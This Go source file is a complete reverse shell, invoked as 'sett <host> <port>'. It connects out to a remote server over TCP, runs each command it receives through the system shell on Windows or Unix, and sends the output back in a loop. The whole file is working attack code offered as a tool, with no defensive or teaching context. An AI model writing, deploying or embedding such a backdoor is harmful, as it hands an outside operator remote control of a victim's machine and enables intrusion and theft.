package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
)

var (
	host string
	port string
)

func executeCommand(command string) ([]byte, error) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe", "/c", command)
	default:
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	return cmd.CombinedOutput()
}

func main() {
	// Get host and port from command-line arguments or fallback to embedded values
	if len(os.Args) > 2 {
		host = os.Args[1]
		port = os.Args[2]
	} else {
		fmt.Println("Usage: sett <host> <port>")
		return
	}

	if host == "" || port == "" {
		fmt.Println("Host and port must be set.")
		return
	}

	// Connect to the remote server
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
	if err != nil {
		fmt.Println("Connection error:", err)
		return
	}
	defer conn.Close()

	for {
		// Read command from the server
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Read error:", err)
			return
		}

		// Execute the command
		output, err := executeCommand(string(buf[:n]))
		if err != nil {
			output = []byte(fmt.Sprintf("Execution error: %s\n", err.Error()))
		}

		// Send the output back to the server
		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Write error:", err)
			return
		}
	}
}
